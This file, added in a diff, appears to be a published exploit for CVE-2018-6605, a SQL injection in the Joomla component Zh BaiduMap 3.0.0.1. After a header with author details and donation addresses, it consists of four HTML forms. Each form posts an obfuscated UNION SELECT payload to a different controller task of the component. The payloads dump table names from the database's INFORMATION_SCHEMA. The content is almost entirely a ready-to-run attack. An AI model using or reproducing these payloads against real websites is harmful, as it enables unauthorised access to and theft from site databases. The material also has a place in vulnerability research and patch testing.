@@ -1,0 +1,61 @@
+<!--
+# # # # #
+# Exploit Title: Joomla! Component Zh BaiduMap 3.0.0.1 - SQL Injection
+# Dork: N/A
+# Date: 04.02.2018
+# Vendor Homepage: http://zhuk.cc/
+# Software Link: https://extensions.joomla.org/extensions/extension/maps-a-weather/maps-a-locations/zh-baidumap/
+# Software Download: http://zhuk.cc/files/pkg_zhbaidumap-j30-3.0.0.1-final.zip
+# Version: 3.0.0.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-6605
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# Want To Donate ?
+# BTC : 1NGEp2eNWRCE6gp2i31UPN6G6KBzMDdCyZ
+# ETH : 0xd606c6b86a1b88c7fcc1f58f7659cfd968449cf2
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# # # # #
+-->
+<html>
+<body>
+<!--com_zhbaidumap/controller.php-->
+
+<!--# 1)-->
+<!--L 27: public function getPlacemarkDetails() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails" method="post">
+<input name="id" value="-11 UNION ALL SELECT 11,11,11,11,11,11,11,11,/*!01111CONCAT*/((/*!01111SELECT*/(@x)/*!01111FROM*/(/*!01111SELECT*/(@x:=0x00),(@NR:=0),(/*!01111SELECT*/(0)/*!01111FROM*/(INFORMATION_SCHEMA.TABLES)/*!01111WHERE*/(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)/*!01111AND*/(0x00)IN(@x:=/*!01111CONCAT*/(@x,/*!01111LPAD*/(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11--" type="hidden">
+<input type="submit" value="1-Ver Ayari">
+</form>
+
+<!--# 2)-->
+<!--L 356: public function getPlacemarkHoverText() {........}-->
+<form action="http://localhost/Joomla375/index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkHoverText" method="post">
+<input name="id" value="-22 UNION ALL SELECT 22,22,22,22,22,22,22,22,/*!02222CONCAT*/((/*!02222SELECT*/(@x)/*!02222FROM*/(/*!02222SELECT*/(@x:=0x00),(@NR:=0),(/*!02222SELECT*/(0)/*!02222FROM*/(INFORMATION_SCHEMA.TABLES)/*!02222WHERE*/(TABLE_SCHEMA!=0x696e226f726d6174696f6e5f736368656d61)/*!02222AND*/(0x00)IN(@x:=/*!02222CONCAT*/(@x,/*!02222LPAD*/(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),22,22--" type="hidden">
+<input type="submit" value="2-Ver Ayari">
+</form>
+
+<!--# 3)-->
+<!--L 411: public function getPathHoverText() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPathHoverText" method="post">
+<input name="id" value="-33 UNION ALL SELECT 33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,/*!03333CONCAT*/((/*!03333SELECT*/(@x)/*!03333FROM*/(/*!03333SELECT*/(@x:=0x00),(@NR:=0),(/*!03333SELECT*/(0)/*!03333FROM*/(INFORMATION_SCHEMA.TABLES)/*!03333WHERE*/(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)/*!03333AND*/(0x00)IN(@x:=/*!03333CONCAT*/(@x,/*!03333LPAD*/(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33--" type="hidden">
+<input type="submit" value="3-Ver Ayari">
+</form>
+
+<!--# 4)-->
+<!--L 756: public function getPathDetails() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPathDetails" method="post">
+<input name="id" value="-44 UNION ALL SELECT 44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,/*!04444CONCAT*/((/*!04444SELECT*/(@x)/*!04444FROM*/(/*!04444SELECT*/(@x:=0x00),(@NR:=0),(/*!04444SELECT*/(0)/*!04444FROM*/(INFORMATION_SCHEMA.TABLES)/*!04444WHERE*/(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)/*!04444AND*/(0x00)IN(@x:=/*!04444CONCAT*/(@x,/*!04444LPAD*/(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44--" type="hidden">
+<input type="submit" value="4-Ver Ayari">
+</form>
+
+</body>
+</html>
